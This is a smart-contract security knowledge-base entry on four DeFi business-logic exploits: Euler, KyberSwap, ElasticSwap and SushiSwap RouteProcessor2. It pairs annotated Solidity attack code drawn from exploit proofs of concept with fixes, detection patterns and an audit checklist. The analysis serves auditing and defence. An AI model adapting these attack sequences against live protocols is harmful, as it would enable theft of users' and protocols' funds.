---
# Core Classification
protocol: "generic"
chain: "ethereum, avalanche"
category: "logic"
vulnerability_type: "business_logic_error"

# Attack Vector Details
attack_type: "economic_exploit"
affected_component: "solvency_check, swap_routing, balance_tracking"

# Technical Primitives
primitives:
  - "missing_health_check"
  - "donate_to_reserves"
  - "self_liquidation"
  - "tick_manipulation"
  - "precision_loss"
  - "internal_balance_divergence"
  - "unchecked_callback"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.5
financial_impact: "critical"

# Context Tags
tags:
  - "defi"
  - "business_logic"
  - "solvency"
  - "liquidation"
  - "concentrated_liquidity"
  - "precision"
  - "AMM"
  - "routing"

# Version Info
language: "solidity"
version: ">=0.8.0"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [EUL-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-03/Euler_exp.sol` |
| [KYB-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-11/KyberSwap_exp.eth.1.sol` |
| [ELS-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-12/ElasticSwap_exp.sol` |
| [SUSHI-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-04/Sushi_Router_exp.sol` |

---

# Business Logic & Solvency Check Vulnerability Patterns (2022-2023)

## Overview

Business logic vulnerabilities in DeFi arise when critical invariants (solvency, balance consistency, routing integrity) are not enforced at the protocol level. Unlike access control or reentrancy bugs, these exploit fundamental design flaws in the protocol's economic logic. The 2022-2023 period saw four major categories: (1) missing solvency checks on reserve donation functions (Euler $200M), (2) precision/tick manipulation in concentrated liquidity AMMs (KyberSwap $48M), (3) internal vs actual balance divergence in AMMs (ElasticSwap $845K), and (4) unchecked callback trust in swap routers (SushiSwap $3.3M). Combined losses: **$252M+**.

---

## 1. Missing Solvency Check on Donation Functions

### Root Cause

Euler Finance's `donateToReserves()` function allowed users to move their eTokens (collateral) to the protocol's reserves without checking whether the account remained solvent after the donation. By donating enough eTokens, an attacker could make their own account intentionally insolvent (debt > collateral), then have a confederate contract liquidate them at the protocol's liquidation discount. The liquidation discount meant the confederate received more collateral than the debt they absorbed, extracting the difference from the protocol.

### Attack Scenario

1. Flash loan initial capital (e.g., 30M DAI)
2. Deploy violator and liquidator contracts
3. Violator deposits, leverages up via `mint()` (creates debt + collateral simultaneously)
4. Violator calls `donateToReserves()` — destroys collateral without solvency check
5. Violator is now intentionally insolvent (eTokens << dTokens)
6. Liquidator calls `liquidate()` — absorbs debt, seizes more collateral than debt absorbed
7. Liquidator withdraws all remaining protocol funds

### Vulnerable Pattern Examples

**Example 1: Euler Finance — donateToReserves Missing Health Check ($200M, March 2023)** [Approx Vulnerability: CRITICAL] `@audit` [EUL-POC]

```solidity
// ❌ VULNERABLE: donateToReserves() has NO solvency check
// Account can become intentionally insolvent

// VIOLATOR CONTRACT
function violator() external {
    DAI.approve(Euler_Protocol, type(uint256).max);

    // Step 1: Deposit 20M DAI → get eDAI
    eDAI.deposit(0, 20_000_000 * 1e18);

    // Step 2: Leverage up → creates both eDAI (collateral) and dDAI (debt)
    eDAI.mint(0, 200_000_000 * 1e18);  // @audit ~195.6M eDAI + 200M dDAI

    // Step 3: Repay some debt
    dDAI.repay(0, 10_000_000 * 1e18);

    // Step 4: Leverage up again
    eDAI.mint(0, 200_000_000 * 1e18);  // More eDAI + more dDAI

    // Step 5: CRITICAL — Donate 100M eDAI to reserves
    // @audit NO HEALTH CHECK! Account becomes insolvent (eDAI << dDAI)
    eDAI.donateToReserves(0, 100_000_000 * 1e18);
    // Health factor drops below 1.0 — account is liquidatable!
}

// LIQUIDATOR CONTRACT
function liquidate(address _violator) external {
    // @audit Self-liquidate the insolvent violator at liquidation discount
    IEuler.LiquidationOpportunity memory returnData =
        Euler.checkLiquidation(address(this), _violator, address(DAI), address(DAI));

    // Seize 310M eDAI collateral, absorb 259M dDAI debt
    // @audit Net profit = 310M - 259M = 51M eDAI
    Euler.liquidate(_violator, address(DAI), address(DAI),
        returnData.repay, returnData.yield);

    // Withdraw ALL remaining DAI from Euler
    eDAI.withdraw(0, DAI.balanceOf(Euler_Protocol));
    DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
}
```

---

## 2. Precision Loss in Concentrated Liquidity Tick Math

### Root Cause

KyberSwap's concentrated liquidity implementation had numeric precision errors in the tick-crossing calculation. When an attacker carefully positioned the pool price at a range boundary with zero liquidity, added a precisely crafted position, removed it, and then executed swaps that crossed this boundary, the swap math produced incorrect output amounts due to precision loss in the tick-to-sqrtPrice conversion. This effectively allowed the attacker to extract more tokens than the pool should have given.

### Vulnerable Pattern Examples

**Example 2: KyberSwap — Tick Manipulation + Precision Loss ($48M, November 2023)** [Approx Vulnerability: CRITICAL] `@audit` [KYB-POC]

```solidity
// ❌ VULNERABLE: Precision errors in tick crossing calculations
// Attacker manipulates pool to exploit numeric edge cases

function _flashCallback(uint256 due) internal returns (bool) {
    int24 __currentTick;
    int24 __nearestCurrentTick;
    uint160 __sqrtP;

    // Step 1: Move price to empty tick range (0 liquidity)
    // @audit Large swap pushes price beyond all existing positions
    IKyberswapPool(_victim).swap(
        _attacker, int256(_amount), false,
        0x100000000000000000000000000,  // Very high sqrtPriceLimit
        ""
    );

    // Step 2: Add precisely crafted liquidity at specific tick
    (__sqrtP, __currentTick, __nearestCurrentTick,) =
        IKyberswapPool(_victim).getPoolState();
    IKyberswapPositionManager(_manager).mint(
        IKyberswapPositionManager.MintParams(
            _token0, _token1, __swap_fee,
            __currentTick, 111_310,   // @audit Specific tick range chosen for precision exploit
            [__nearestCurrentTick, __nearestCurrentTick],
            6_948_087_773_336_076,     // Precise amount
            107_809_615_846_697_233,   // Precise amount
            0, 0, _attacker, block.timestamp
        )
    );

    // Step 3: Remove liquidity
    IKyberswapPositionManager(_manager).removeLiquidity(...);

    // Step 4: Exploit tick crossing math with back-and-forth swaps
    // @audit First swap pushes to max → tick crossing has precision error
    IKyberswapPool(_victim).swap(
        _attacker, 387_170_294_533_119_999_999, false,
        1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341, // Max sqrt
        ""
    );
    // @audit Second swap drains ALL remaining token1 from pool
    IKyberswapPool(_victim).swap(
        _attacker, -int256(IERC20(_token1).balanceOf(_victim)), false,
        4_295_128_740,  // Min sqrt price
        ""
    );
}
// @audit Replicated across 7+ chains (ETH, Arb, OP, Polygon, BSC, AVAX) → total ~$48M
```

---

## 3. Internal vs Actual Balance Divergence

### Root Cause

ElasticSwap tracked internal balances (`baseTokenReserveQty`, `quoteTokenReserveQty`, `kLast`) separately from actual ERC20 token balances. When tokens were directly transferred to the exchange contract (not through `addLiquidity()`), a "decay" formed — the actual balance exceeded the internal tracking. Functions like `addLiquidity()`, `removeLiquidity()`, and `swap()` used these divergent values inconsistently, allowing the attacker to extract more value than deposited by manipulating the decay.

### Vulnerable Pattern Examples

**Example 3: ElasticSwap — Balance Decay Exploitation ($845K, December 2022)** [Approx Vulnerability: HIGH] `@audit` [ELS-POC]

```solidity
// ❌ VULNERABLE: Internal balance tracking diverges from actual ERC20 balance
// Direct transfers create "decay" that can be exploited in LP operations

// ElasticSwap tracks internal state:
// struct InternalBalances {
//     uint256 baseTokenReserveQty;   // x (internal tracking)
//     uint256 quoteTokenReserveQty;  // y (internal tracking)
//     uint256 kLast;                 // x*y=k snapshot
// }
// Actual ERC20 balance can differ from internal tracking → "decay"

// Step 1: Add liquidity with manipulated ratio
ELP.addLiquidity(1e9, 0, 0, 0, address(this), _expirationTimestamp);
ELP.addLiquidity(TICAmount, USDC_EAmount, 0, 0, address(this), _expirationTimestamp);

// Step 2: Direct transfer creates decay
// @audit actual balance > internal reserve tracking
USDC_E.transfer(address(ELP), USDC_E.balanceOf(address(ELP)));

// Step 3: Remove liquidity — gets back MORE than deposited due to decay
ELP.removeLiquidity(
    ELP.balanceOf(address(this)), 1, 1, address(this), _expirationTimestamp
);

// Step 4: Swap using manipulated internal reserves
// @audit Internal reserves diverge from actual → swap gives excess tokens
ELPExchange.InternalBalances memory InternalBalance = ELP.internalBalances();
uint256 USDC_EReserve = InternalBalance.quoteTokenReserveQty;
ELP.swapQuoteTokenForBaseToken(USDC_EReserve * 100, 1, _expirationTimestamp);

// Step 5: Add/remove again for additional profit
ELP.addLiquidity(TICAmount, USDC_EAmount, 0, 0, address(this), _expirationTimestamp);
ELP.removeLiquidity(
    ELP.balanceOf(address(this)), 1, 1, address(this), _expirationTimestamp
);
// @audit Net profit ~$845K from decay exploitation
```

---

## 4. Unchecked Swap Router Callback Trust

### Root Cause

SushiSwap's RouteProcessor2 accepted arbitrary `route` bytes that could specify any contract address as a "pool" for swap callbacks. When the router called `swap()` on the attacker's fake "pool" contract, the attacker's contract called back `uniswapV3SwapCallback()` on the RouterProcessor2 with a victim's address encoded in the callback data. The router trusted the callback and executed `transferFrom(victim, pool, amount)`, pulling tokens from victims who had approved the router.

### Vulnerable Pattern Examples

**Example 4: SushiSwap RouteProcessor2 — Arbitrary Pool Callback ($3.3M, April 2023)** [Approx Vulnerability: CRITICAL] `@audit` [SUSHI-POC]

```solidity
// ❌ VULNERABLE: RouteProcessor2 trusts arbitrary contract as swap pool
// Callback pulls tokens from any address encoded in data

// Attacker constructs malicious route bytes:
uint8 commandCode = 1;           // processMyERC20 command
uint8 poolType = 1;              // UniswapV3-style pool
address pool = address(this);    // @audit ATTACKER'S CONTRACT as "pool"!
bytes memory route = abi.encodePacked(
    commandCode, address(LINK), num, share, poolType, pool, zeroForOne, recipient
);

// RouteProcessor2 processes route → calls swap on attacker's "pool"
processor.processRoute(
    0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, 0,
    0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, 0,
    address(0), route
);

// @audit Attacker's fake "pool" — called by RouteProcessor2
function swap(...) external returns (int256, int256) {
    // Construct malicious callback data with VICTIM address
    bytes memory malicious_data = abi.encode(address(WETH), victim);
    // @audit RouteProcessor2 trusts this callback
    // and pulls tokens FROM VICTIM (who approved the router)
    processor.uniswapV3SwapCallback(100 * 10 ** 18, 0, malicious_data);
    return (0, 0);
}

// The vulnerable callback in RouteProcessor2:
// function uniswapV3SwapCallback(int256 amount0Delta, ..., bytes calldata data) {
//     (address tokenIn, address from) = abi.decode(data, (address, address));
//     IERC20(tokenIn).transferFrom(from, msg.sender, uint256(amount0Delta));
//     // @audit MISSING: verify msg.sender is an actual Uniswap V3 pool!
//     // Any contract can call this callback and specify any 'from' address
// }
```

---

## Impact Analysis

### Technical Impact
- Controlled insolvency enables protocol-draining self-liquidation (Euler: $200M)
- Precision errors in AMM math can drain entire pools (KyberSwap: deployed on 7+ chains)
- Balance tracking divergence allows extraction exceeding deposits (ElasticSwap)
- Callback trust exploitation drains all users who approved the router (SushiSwap)

### Business Impact
- **Total losses 2022-2023:** $252M+ (Euler $200M, KyberSwap $48M, SushiSwap $3.3M, ElasticSwap $845K)
- Euler was the largest single exploit before the attacker returned funds
- KyberSwap demonstrated cross-chain exploit replication (same vulnerability on 7 chains)
- SushiSwap showed that approval-based attacks can affect all users of a router contract

### Affected Scenarios
- Lending protocols with donation/reserve functions missing solvency checks
- Concentrated liquidity AMMs with complex tick-crossing math
- AMMs tracking internal balances separately from actual token balances
- Swap routers accepting arbitrary pool addresses or callback data
- Any protocol where critical invariants (solvency, balance, routing) are not enforced

---

## Secure Implementation

**Fix 1: Solvency Check After Every Collateral-Reducing Operation**
```solidity
// ✅ SECURE: Check health factor after donateToReserves
function donateToReserves(uint subAccountId, uint amount) external {
    // ... perform donation logic ...
    
    // CRITICAL: Check account health AFTER the donation
    require(
        checkAccountHealth(msg.sender) >= MIN_HEALTH_FACTOR,
        "Account would become insolvent"
    );
}
```

**Fix 2: Verified Pool Callback**
```solidity
// ✅ SECURE: Verify callback comes from a registered pool
contract SecureRouteProcessor {
    mapping(address => bool) public registeredPools;
    
    function uniswapV3SwapCallback(
        int256 amount0Delta, int256 amount1Delta, bytes calldata data
    ) external {
        // MUST verify msg.sender is a legitimate pool
        require(registeredPools[msg.sender], "Not a registered pool");
        
        // Alternatively, compute expected pool address from factory + salt
        address expectedPool = IUniswapV3Factory(factory).getPool(token0, token1, fee);
        require(msg.sender == expectedPool, "Invalid pool");
        
        // Now safe to decode and transfer
        (address tokenIn,) = abi.decode(data, (address, address));
        IERC20(tokenIn).safeTransferFrom(/* only from router deposits, never from users */);
    }
}
```

**Fix 3: Internal Balance Consistency**
```solidity
// ✅ SECURE: Sync internal balance tracking on every operation
contract SecureAMM {
    function _syncBalances() internal {
        uint256 actualBase = baseToken.balanceOf(address(this));
        uint256 actualQuote = quoteToken.balanceOf(address(this));
        
        // Option 1: Reject if divergence detected
        require(
            actualBase >= internalBalances.baseTokenReserveQty,
            "Base token balance mismatch"
        );
        
        // Option 2: Use actual balance, not internal tracking
        internalBalances.baseTokenReserveQty = actualBase;
        internalBalances.quoteTokenReserveQty = actualQuote;
    }
}
```

---

## Detection Patterns

### Code Patterns to Look For
```
- `donateToReserves()` or similar without subsequent health/solvency check
- AMM tick-crossing math with potential precision loss in sqrtPrice conversions
- Internal balance tracking (reserveQty, internalBalance) separate from balanceOf()
- Swap router callbacks (uniswapV3SwapCallback, pancakeV3SwapCallback) without pool verification
- route bytes that include arbitrary pool addresses decoded from user input
- transferFrom(from, ...) where 'from' comes from callback data, not msg.sender
- Liquidation functions that allow net profit (seized collateral > absorbed debt)
- Protocol functions that reduce collateral without checking solvency afterward
```

### Audit Checklist
- [ ] Do all collateral-reducing functions check solvency afterward?
- [ ] Are swap router callbacks verified against registered pool addresses?
- [ ] Does the AMM track balances internally? Can divergence be exploited?
- [ ] Are tick-crossing calculations tested for precision at boundary conditions?
- [ ] Can liquidation yield net profit to the liquidator (seized > repaid)?
- [ ] Are route bytes validated before executing arbitrary pool interactions?
- [ ] Is `transferFrom` in callbacks constrained to msg.sender's own funds?

---

## Real-World Examples

### Known Exploits
- **Euler Finance** — donateToReserves() missing health check, Ethereum — March 2023 — $200M
  - Root cause: No solvency check in donateToReserves → controlled insolvency → self-liquidation
- **KyberSwap** — Tick manipulation + precision loss, Multi-chain — November 2023 — $48M
  - Root cause: Numeric precision errors in concentrated liquidity tick crossing math
- **SushiSwap RouteProcessor2** — Arbitrary pool callback, Ethereum — April 2023 — $3.3M
  - Root cause: uniswapV3SwapCallback trusted arbitrary contracts as pools, drained user approvals
- **ElasticSwap** — Internal balance divergence, Avalanche — December 2022 — $845K
  - Root cause: Internal vs actual balance "decay" exploited via LP operations

---

## Prevention Guidelines

### Development Best Practices
1. Enforce solvency checks after ALL collateral-reducing operations (not just borrows)
2. Verify callback caller identity against factory-computed pool addresses
3. Use actual token balances (`balanceOf`) or sync internal tracking on every operation
4. Extensively test AMM tick-crossing with edge-case values and precision boundaries
5. Never allow `transferFrom` where the `from` address comes from untrusted callback data
6. Implement invariant checks: total collateral ≥ total debt after every operation

### Testing Requirements
- Unit tests for: donateToReserves with subsequent insolvency check, callback from non-pool address
- Integration tests for: full self-liquidation flow, cross-chain exploit replication
- Fuzzing targets: tick-crossing calculations, sqrtPrice conversions, balance tracking consistency
- Invariant tests: pool balance always matches sum of deposits minus withdrawals

---

## Keywords for Search

> `donateToReserves`, `missing health check`, `solvency check`, `self-liquidation`, `controlled insolvency`, `Euler Finance`, `KyberSwap`, `tick manipulation`, `precision loss`, `concentrated liquidity`, `sqrtPrice`, `tick crossing`, `internal balance`, `balance divergence`, `decay exploitation`, `ElasticSwap`, `swap callback`, `uniswapV3SwapCallback`, `RouteProcessor2`, `arbitrary pool`, `callback trust`, `route bytes`, `pool verification`, `business logic flaw`

---

## Related Vulnerabilities

- `DB/general/vault-inflation-attack/defihacklabs-vault-inflation-patterns.md` — Share/vault accounting
- `DB/amm/concentrated-liquidity/` — Concentrated liquidity AMM patterns
- `DB/general/precision/` — Precision and rounding vulnerabilities
- `DB/general/arbitrary-call/` — Arbitrary external call patterns
- `DB/general/business-logic/defihacklabs-share-accounting-patterns.md` — Share accounting flaws
